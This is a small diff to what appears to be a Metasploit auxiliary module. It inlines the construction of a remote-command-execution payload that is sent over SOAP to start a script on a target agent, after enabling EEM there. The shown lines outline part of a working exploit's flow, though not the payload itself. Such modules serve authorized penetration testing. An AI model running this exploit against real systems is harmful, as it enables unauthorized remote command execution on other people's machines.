@@ -150,9 +150,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Enable EEM on agent: #{@agent_name}")
     enable_eem(@agent_name)
 
-    rce_payload = make_rce_payload(@rce_command)
     print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
-    send_soap_request(make_soap_body(@agent_name, @script_name, rce_payload))
+    send_soap_request(make_soap_body(@agent_name, @script_name, make_rce_payload(@rce_command)))
 
     print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
     stop_script_in_agent(@agent_name, @script_name)
